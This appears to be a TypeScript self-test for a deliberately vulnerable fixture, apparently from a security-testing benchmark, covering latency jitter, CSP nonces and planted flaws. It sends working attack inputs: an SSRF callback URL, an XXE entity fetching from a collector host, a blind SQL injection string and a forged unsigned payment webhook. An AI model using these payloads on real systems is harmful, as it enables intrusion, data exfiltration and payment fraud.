// Self-test for Fixture #2 — proves WAN jitter, nonce rotation, blind SQLi, and
// asynchronous SSRF/XXE/webhook callbacks that arrive after the HTTP response.
import assert from 'node:assert/strict'
import { DEFAULT_CALLBACK_DELAY_MS, DEFAULT_JITTER_MS, start, type CallbackEvent } from './index.ts'

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

async function waitFor<T>(probe: () => T | null | undefined, timeoutMs = 4000): Promise<T> {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    const value = probe()
    if (value !== null && value !== undefined) return value
    await sleep(20)
  }
  throw new Error('timed out waiting for asynchronous callback')
}

export async function runSelfTest(): Promise<string[]> {
  const checks: string[] = []
  assert.deepEqual(DEFAULT_JITTER_MS, [50, 300])
  assert.deepEqual(DEFAULT_CALLBACK_DELAY_MS, [15000, 30000])
  checks.push('documented 50–300ms jitter and 15–30s callback defaults')

  const fixture = await start({ seed: 11, jitterMs: [50, 300], callbackDelayMs: [50, 80] })
  const proxy = fixture.proxyOrigin
  const collector = fixture.collectorOrigin

  try {
    // 1. Edge proxy adds in-range latency and varies it
    const wanValues: number[] = []
    for (let i = 0; i < 5; i++) {
      const started = Date.now()
      const response = await fetch(`${proxy}/v1/health`)
      assert.equal(response.status, 200)
      const elapsed = Date.now() - started
      const wan = Number(response.headers.get('x-wan-ms'))
      assert.ok(Number.isFinite(wan))
      assert.ok(wan >= 50 && wan <= 300, `wan header ${wan} within range`)
      assert.ok(elapsed >= 45, `request took at least the injected delay (${elapsed}ms)`)
      wanValues.push(wan)
    }
    assert.ok(new Set(wanValues).size >= 2, 'jitter is not a constant delay')
    checks.push('wan latency jitter 50–300ms')

    // 2. Rotating HTML nonces match the CSP header and change per response
    const nonces: string[] = []
    for (let i = 0; i < 4; i++) {
      const response = await fetch(`${proxy}/portal`)
      const html = await response.text()
      const csp = response.headers.get('content-security-policy') ?? ''
      const cspNonce = /script-src 'nonce-([a-f0-9]+)'/.exec(csp)?.[1]
      assert.ok(cspNonce)
      assert.equal(response.headers.get('x-edge-nonce'), cspNonce)
      assert.match(html, new RegExp(`nonce="${cspNonce}"`))
      assert.doesNotMatch(html, /__NONCE__/)
      nonces.push(cspNonce)
    }
    assert.equal(new Set(nonces).size, nonces.length, 'every response gets a fresh nonce')
    checks.push('rotating html nonce + csp')

    // 3. Async SSRF: 202 first, callback only later
    const ssrfTarget = `${collector}/ssrf?token=ssrf-canary-1`
    const ssrfResponse = await fetch(`${proxy}/v1/integrations/webhook-test`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ url: ssrfTarget, token: 'ssrf-canary-1' }),
    })
    assert.equal(ssrfResponse.status, 202)
    const ssrfBody = (await ssrfResponse.json()) as { accepted: boolean }
    assert.equal(ssrfBody.accepted, true)
    assert.equal(fixture.collector.events().length, 0, 'no callback evidence in the synchronous response window')
    const ssrfEvent = await waitFor<CallbackEvent>(() => fixture.collector.events().find((e) => e.token === 'ssrf-canary-1'))
    assert.equal(ssrfEvent.kind, 'ssrf')
    checks.push('async ssrf callback after response')

    // 4. Async XXE entity resolution
    const xml = `<?xml version="1.0"?><!DOCTYPE invoice [<!ENTITY xxe SYSTEM "${collector}/xxe?token=xxe-canary-1">]><invoice><vendor>&xxe;</vendor></invoice>`
    const xxeResponse = await fetch(`${proxy}/v1/import/preview`, {
      method: 'POST',
      headers: { 'content-type': 'text/xml' },
      body: xml,
    })
    assert.equal(xxeResponse.status, 202)
    const xxeEvent = await waitFor<CallbackEvent>(() => fixture.collector.events().find((e) => e.token === 'xxe-canary-1'))
    assert.equal(xxeEvent.kind, 'xxe')
    checks.push('async xxe callback after response')

    // 5. Blind SQLi: identical response bodies, callback distinguishes the branch
    const safeBody = await (await fetch(`${proxy}/v1/catalog/search?q=widgets`)).text()
    const injectedBody = await (await fetch(`${proxy}/v1/catalog/search?q=${encodeURIComponent("widgets' OR 1=1 --")}`)).text()
    assert.equal(injectedBody, safeBody, 'blind response body is identical')
    const sqliEvent = await waitFor<CallbackEvent>(() => fixture.collector.events().find((e) => e.kind === 'sqli'))
    assert.match(sqliEvent.token, /^sqli-/)
    const sqliCount = fixture.collector.events().filter((e) => e.kind === 'sqli').length
    await fetch(`${proxy}/v1/catalog/search?q=widgets`)
    await sleep(250)
    assert.equal(fixture.collector.events().filter((e) => e.kind === 'sqli').length, sqliCount, 'benign search stays silent')
    checks.push('blind sqli via async oob oracle')

    // 6. Unsigned billing webhook is accepted (forgery); bad signature is rejected
    const forged = await fetch(`${proxy}/v1/billing/webhook`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ event: 'invoice.paid', amount: 9900 }),
    })
    const forgedBody = (await forged.json()) as { credited: boolean; canary: string }
    assert.equal(forged.status, 200)
    assert.equal(forgedBody.credited, true)
    assert.equal(forgedBody.canary, 'rbs_fake_webhook_credit')
    const badSignature = await fetch(`${proxy}/v1/billing/webhook`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-webhook-signature': 'sha256=wrong' },
      body: JSON.stringify({ event: 'invoice.paid' }),
    })
    assert.equal(badSignature.status, 401)

    // Async webhook callback: a supplied token schedules a post-response delivery.
    const webhookBefore = fixture.collector.events().filter((e) => e.kind === 'webhook').length
    const asyncWebhook = await fetch(`${proxy}/v1/billing/webhook`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ event: 'invoice.paid', amount: 100, token: 'webhook-canary-1' }),
    })
    assert.equal(asyncWebhook.status, 200)
    assert.equal(fixture.collector.events().filter((e) => e.kind === 'webhook').length, webhookBefore)
    const webhookEvent = await waitFor<CallbackEvent>(() =>
      fixture.collector.events().find((e) => e.kind === 'webhook' && e.token === 'webhook-canary-1'),
    )
    assert.equal(webhookEvent.kind, 'webhook')
    checks.push('unsigned webhook accepted / bad signature rejected')
    checks.push('async webhook callback after response')

    // 7. Hardened importer decoy rejects external entities
    const safe = await fetch(`${proxy}/v1/import/safe-preview`, {
      method: 'POST',
      headers: { 'content-type': 'text/xml' },
      body: xml,
    })
    assert.equal(safe.status, 400)
    checks.push('safe-preview decoy rejects doctype')

    await waitFor(() => (fixture.worker.pending() === 0 ? true : null))
    assert.ok(fixture.worker.completed() >= 3)
  } finally {
    await fixture.stop()
    assert.equal(fixture.worker.pending(), 0)
    assert.equal(fixture.collector.events().length, 0)
    await fixture.stop()
  }
  return checks
}
